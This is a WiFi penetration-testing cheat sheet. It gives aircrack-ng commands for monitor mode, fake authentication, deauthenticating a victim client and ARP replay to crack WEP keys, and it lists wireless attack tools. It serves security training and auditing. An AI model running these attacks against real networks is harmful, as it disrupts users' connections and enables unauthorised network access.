# Wifi - Basics

## Tools

* [aircrack-ng/aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) - WiFi security auditing tools suite
* [kimocoder/wifite2](https://github.com/kimocoder/wifite2) - Rewrite of the popular wireless network auditor, "wifite" - original by @derv82
* [derv82/wifite2](https://github.com/derv82/wifite2) - Rewrite of the popular wireless network auditor, "wifite" 
* [derv82/wifite](https://github.com/derv82/wifite) - Wifite is an automated wireless attack tool.


## Linux Wireless Basics

```powershell
AP_MAC="XX:XX:XX:XX:XX"       # BSSID
VICTIM_MAC="XX:XX:XX:XX:XX"   # VIC
ATTACKER_MAC="XX:XX:XX:XX:XX" # MON
AP_SSID="wifibox"             # ESSID
SRC_ADDR="192.168.1.1"
DST_ADDR="192.168.1.255"
```

```powershell
# driver install
apt install realtek-rtl88xxau-dkms

# network card recon
iwconfig
iw list
dmesg | grep 8187 # alfa card

# Increase Wi-Fi TX Power
iw reg set B0
iwconfig wlan0 txpower <NmW|NdBm|off|auto> # txpower is 30 (usually)

# find SSID and channel
iw dev wlan0 scan | grep SSID
iw dev wlan0 scan | egrep "DS\ Parameter\ set|SSID"
iwlist wlan0 scanning | egrep "ESSID|Channel"

# monitor mode - start
airmon-ng start wlan0
airmon-ng start wlan0 3 # only on a particular channel e.g: 3
    * Manual 1: iw dev wlan0 interface add mon0 type monitor
    * Manual 2: iwconfig wlan0 mode monitor channel 3
ifconfig mon0 up
# monitor mode - stop
airmon-ng stop mon0
    * Manual 1: iw dev wlan0 interface del mon0 
    * Manual 2: iwconfig wlan0 mode managed
```


## Aircrack-ng Essentials

```powershell
# check and kill processes that could interfere with our monitor mode
airmon-ng check
airmon-ng check kill
# pkill dhclient; pkill wpa_supplicant; pkill dhclient3

# list AP
airodump-ng mon0
airodump-ng mon0 -c 3 # only on a particular channel e.g: 3
airodump-ng mon0 -c 3 --bssid $AP_MAC -w clearcap # dump traffic

# get our macaddress
macchanger -s mon0 
macchanger --show mon0

# replay and accelerate traffic
aireplay-ng
    * -i interface
    * -r file.pcap

# check aireplay card compatibility
aireplay-ng -9 mon0 -> test injection
aireplay-ng -9 -i wlan1 mon0 -> test card to card injection

# injection rate
iwconfig wlan0 rate 1M

# Aircrack compatibility
http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters
Alfa AWUS036H / TPLink WN722
```


### Fake authentication attack

:warning: use it before each attack

```powershell
airodump-ng -c 3 --bssid $AP_MAC -w wep1 mon0

# fake authentication = no arp
aireplay-ng -1 0 -e AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0
    * Might need a real $ATTACKER_MAC, observe traffic using airodump
	> Association successful! :-)

# fake authentication for picky AP
# Send keep-alive packets every 10 seconds
aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>

# might need to fake your MAC ADDRESS first
```


### Deauthentication attack

> Force ARP packet to be sent.

```powershell
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
    * -0 : 1 deauthentication, 0 unlimited
	> Sending 64 directed DeAuth.
```


### ARP Replay Attack

Video: wifu-20.mp4 The attack listens for an ARP packet and then retransmits it back to the access point. This, in turn, causes the AP to repeat the ARP packet with a new IV. By collecting enough of these IVs Aircrack-ng can then be used to crack the WEP key.

```powershell
aireplay-ng -3 -b $AP_MAC -h $ATTACKER_MAC mon0
	* ATTACKER_MAC if fake authentication launched
	* CONNECTED_MAC if a client is associated

# –x 1000 –n 1000 ?
# aireplay-ng -3 –x 1000 –n 1000 –b $AP_MAC -h $ATTACKER_MAC wlan0mon
# wait for ARP on the network
# alternatively you can de-auth some clients

aircrack-ng –b <BSSID> <PCAP_of_FileName>
aircrack-ng -0 wep1.cap
    * -0 : colored output
```


## References

* [Wireless Penetration Testing Cheat Sheet [UPDATED – 2022]](https://uceka.com/2014/05/12/wireless-penetration-testing-cheat-sheet/)
* [Aireplay 0841 Attack – Introduction](https://www.doyler.net/security-not-included/aireplay-0841-attack)